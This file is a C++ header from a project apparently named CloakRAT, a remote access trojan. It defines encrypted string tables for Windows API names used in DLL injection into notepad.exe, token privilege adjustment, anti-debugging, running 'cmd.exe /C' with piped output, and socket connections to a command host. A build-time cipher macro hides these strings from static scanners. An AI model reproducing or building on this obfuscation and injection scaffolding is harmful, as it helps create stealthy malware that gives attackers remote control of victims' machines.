#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i * 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i * BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 64)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 154, 63, 135, 40, 116, 249, 90, 155, 108, 190, 211, 28, 24, 86, 141, 234 };

typedef struct EncryptedString {
    unsigned char* data;
    size_t length;
} EncryptedString;

// "127.0.0.1"
static unsigned char str_ip_data[] = { 84, 112, 112, 116, 110, 113, 108, 115, 110, 112, 66 };
static EncryptedString str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static unsigned char str_cmd_data[] = { 125, 34, 47, 39, 110, 36, 58, 38, 96, 110, 1, 67 };
static EncryptedString str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static unsigned char str_dllPath_data[] = { 93, 2, 120, 31, 21, 50, 39, 49, 51, 29, 54, 34, 44, 118, 122, 31, 68, 32, 97, 40, 36, 108, 34, 87, 23, 46, 124, 40, 51, 49, 35, 0, 37, 29, 1, 63, 111, 104, 41, 17, 1, 21, 14, 59, 118, 117, 14, 49, 37, 61, 47, 114, 115, 60, 94, 96, 44, 46, 51, 40, 82, 64, 22, 109, 36, 125, 126, 67 };
static EncryptedString str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static unsigned char str_procName_data[] = { 33, 47, 45, 55, 37, 49, 35, 39, 110, 36, 58, 38, 64 };
static EncryptedString str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "NtSetInformationThread"
static unsigned char str_NtSetInformationThread_data[] = { 6, 15, 54, 16, 37, 53, 11, 45, 38, 46, 48, 46, 33, 53, 43, 44, 110, 17, 122, 49, 53, 98, 54, 11 };
static EncryptedString str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static unsigned char str_GetCurrentThread_data[] = { 49, 6, 39, 55, 3, 52, 48, 49, 37, 47, 54, 23, 40, 51, 39, 34, 100, 69 };
static EncryptedString str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static unsigned char str_Sleep_data[] = { 115, 18, 46, 38, 37, 49, 66 };
static EncryptedString str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static unsigned char str_OpenProcess_data[] = { 67, 14, 50, 38, 46, 17, 48, 44, 35, 36, 49, 48, 64 };
static EncryptedString str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static unsigned char str_VirtualAllocEx_data[] = { 9, 23, 43, 49, 52, 52, 35, 47, 1, 45, 46, 44, 35, 4, 58, 67 };
static EncryptedString str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static unsigned char str_WriteProcessMemory_data[] = { 79, 22, 48, 42, 52, 36, 18, 49, 47, 34, 39, 48, 51, 12, 39, 46, 111, 55, 107, 67 };
static EncryptedString str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static unsigned char str_LoadLibraryA_data[] = { 102, 13, 45, 34, 36, 13, 43, 33, 50, 32, 48, 58, 1, 65 };
static EncryptedString str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static unsigned char str_CreateRemoteThread_data[] = { 61, 2, 48, 38, 33, 53, 39, 17, 37, 44, 45, 55, 37, 21, 42, 49, 101, 36, 118, 67 };
static EncryptedString str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static unsigned char str_CloseHandle_data[] = { 50, 2, 46, 44, 51, 36, 10, 34, 46, 37, 46, 38, 64 };
static EncryptedString str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static unsigned char str_LookupPrivilegeValueA_data[] = { 35, 13, 45, 44, 43, 52, 50, 19, 50, 40, 52, 42, 44, 36, 37, 38, 86, 36, 126, 54, 53, 66, 82 };
static EncryptedString str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static unsigned char str_GetLastError_data[] = { 55, 6, 39, 55, 12, 32, 49, 55, 5, 51, 48, 44, 50, 65 };
static EncryptedString str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static unsigned char str_AdjustTokenPrivileges_data[] = { 109, 0, 38, 41, 53, 50, 54, 23, 47, 42, 39, 45, 16, 51, 43, 53, 105, 41, 119, 36, 53, 112, 82 };
static EncryptedString str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static unsigned char str_OpenProcessToken_data[] = { 123, 14, 50, 38, 46, 17, 48, 44, 35, 36, 49, 48, 20, 46, 41, 38, 110, 69 };
static EncryptedString str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static unsigned char str_GetCurrentProcess_data[] = { 70, 6, 39, 55, 3, 52, 48, 49, 37, 47, 54, 19, 50, 46, 33, 38, 115, 54, 18 };
static EncryptedString str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static unsigned char str_CreateToolhelp32Snapshot_data[] = { 92, 2, 48, 38, 33, 53, 39, 23, 47, 46, 46, 43, 37, 45, 50, 112, 50, 22, 124, 34, 32, 112, 58, 100, 52, 65 };
static EncryptedString str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static unsigned char str_Process32First_data[] = { 83, 17, 48, 44, 35, 36, 49, 48, 115, 115, 4, 42, 50, 50, 54, 67 };
static EncryptedString str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static unsigned char str_Process32Next_data[] = { 46, 17, 48, 44, 35, 36, 49, 48, 115, 115, 12, 38, 56, 53, 66 };
static EncryptedString str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static unsigned char str_CreatePipe_data[] = { 54, 2, 48, 38, 33, 53, 39, 19, 41, 49, 39, 67 };
static EncryptedString str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static unsigned char str_SetHandleInformation_data[] = { 4, 18, 39, 55, 8, 32, 44, 39, 44, 36, 11, 45, 38, 46, 48, 46, 97, 49, 123, 44, 62, 3 };
static EncryptedString str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static unsigned char str_ReadFile_data[] = { 71, 19, 39, 34, 36, 7, 43, 47, 37, 65 };
static EncryptedString str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static unsigned char str_FormatMessageA_data[] = { 47, 7, 45, 49, 45, 32, 54, 14, 37, 50, 49, 34, 39, 36, 3, 67 };
static EncryptedString str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static unsigned char str_LocalFree_data[] = { 60, 13, 45, 32, 33, 45, 4, 49, 37, 36, 66 };
static EncryptedString str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static unsigned char str_CreateProcessA_data[] = { 83, 2, 48, 38, 33, 53, 39, 19, 50, 46, 33, 38, 51, 50, 3, 67 };
static EncryptedString str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static unsigned char str_IsDebuggerPresent_data[] = { 35, 8, 49, 7, 37, 35, 55, 36, 39, 36, 48, 19, 50, 36, 49, 38, 110, 49, 18 };
static EncryptedString str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static unsigned char str_GetModuleHandleW_data[] = { 15, 6, 39, 55, 13, 46, 38, 54, 44, 36, 10, 34, 46, 37, 46, 38, 87, 69 };
static EncryptedString str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static unsigned char str_VirtualProtect_data[] = { 77, 23, 43, 49, 52, 52, 35, 47, 16, 51, 45, 55, 37, 34, 54, 67 };
static EncryptedString str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static unsigned char str_HeapSetInformation_data[] = { 67, 9, 39, 34, 48, 18, 39, 55, 9, 47, 36, 44, 50, 44, 35, 55, 105, 42, 124, 67 };
static EncryptedString str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static unsigned char str_FindWindowW_data[] = { 83, 7, 43, 45, 36, 22, 43, 45, 36, 46, 53, 20, 64 };
static EncryptedString str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static unsigned char str_GetProcessHeap_data[] = { 55, 6, 39, 55, 16, 51, 45, 32, 37, 50, 49, 11, 37, 32, 50, 67 };
static EncryptedString str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static unsigned char str_GetComputerNameW_data[] = { 76, 6, 39, 55, 3, 46, 47, 51, 53, 53, 39, 49, 14, 32, 47, 38, 87, 69 };
static EncryptedString str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static unsigned char str_OpenThread_data[] = { 85, 14, 50, 38, 46, 21, 42, 49, 37, 32, 38, 67 };
static EncryptedString str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static unsigned char str_GetEnvironmentVariableW_data[] = { 61, 6, 39, 55, 5, 47, 52, 42, 50, 46, 44, 46, 37, 47, 54, 21, 97, 55, 123, 34, 50, 111, 55, 92, 64 };
static EncryptedString str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static unsigned char str_GetThreadContext_data[] = { 61, 6, 39, 55, 20, 41, 48, 38, 33, 37, 1, 44, 46, 53, 39, 59, 116, 69 };
static EncryptedString str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static unsigned char str_IsWow64Process_data[] = { 115, 8, 49, 20, 47, 54, 116, 119, 16, 51, 45, 32, 37, 50, 49, 67 };
static EncryptedString str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static unsigned char str_GetWindowLongPtrW_data[] = { 67, 6, 39, 55, 23, 40, 44, 39, 47, 54, 14, 44, 46, 38, 18, 55, 114, 18, 18 };
static EncryptedString str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static unsigned char str_GetWindowRect_data[] = { 56, 6, 39, 55, 23, 40, 44, 39, 47, 54, 16, 38, 35, 53, 66 };
static EncryptedString str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static unsigned char str_WSAStartup_data[] = { 116, 22, 17, 2, 19, 53, 35, 49, 52, 52, 50, 67 };
static EncryptedString str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static unsigned char str_htons_data[] = { 102, 41, 54, 44, 46, 50, 66 };
static EncryptedString str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static unsigned char str_inet_pton_data[] = { 119, 40, 44, 38, 52, 30, 50, 55, 47, 47, 66 };
static EncryptedString str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static unsigned char str_connect_data[] = { 28, 34, 45, 45, 46, 36, 33, 55, 64 };
static EncryptedString str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static unsigned char str_htonl_data[] = { 92, 41, 54, 44, 46, 45, 66 };
static EncryptedString str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static unsigned char str_send_data[] = { 98, 50, 39, 45, 36, 65 };
static EncryptedString str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static unsigned char str_socket_data[] = { 95, 50, 45, 32, 43, 36, 54, 67 };
static EncryptedString str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static unsigned char str_recv_data[] = { 78, 51, 39, 32, 54, 65 };
static EncryptedString str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static unsigned char str_ntohl_data[] = { 2, 47, 54, 44, 40, 45, 66 };
static EncryptedString str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static unsigned char str_closesocket_data[] = { 93, 34, 46, 44, 51, 36, 49, 44, 35, 42, 39, 55, 64 };
static EncryptedString str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static unsigned char str_WSACleanup_data[] = { 106, 22, 17, 2, 3, 45, 39, 34, 46, 52, 50, 67 };
static EncryptedString str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static unsigned char str_kernel32_data[] = { 22, 42, 39, 49, 46, 36, 46, 112, 114, 111, 38, 47, 44, 65 };
static EncryptedString str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static unsigned char str_ntdll_data[] = { 83, 47, 54, 39, 44, 45, 108, 39, 44, 45, 66 };
static EncryptedString str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static unsigned char str_advapi32_data[] = { 12, 32, 38, 53, 33, 49, 43, 112, 114, 111, 38, 47, 44, 65 };
static EncryptedString str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static unsigned char str_ws2_32_data[] = { 29, 54, 49, 113, 31, 114, 112, 109, 36, 45, 46, 67 };
static EncryptedString str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static unsigned char str_user32_data[] = { 93, 52, 49, 38, 50, 114, 112, 109, 36, 45, 46, 67 };
static EncryptedString str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static unsigned char str_WSAGetLastError_data[] = { 96, 22, 17, 2, 7, 36, 54, 15, 33, 50, 54, 6, 50, 51, 45, 49, 0 };
static EncryptedString str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

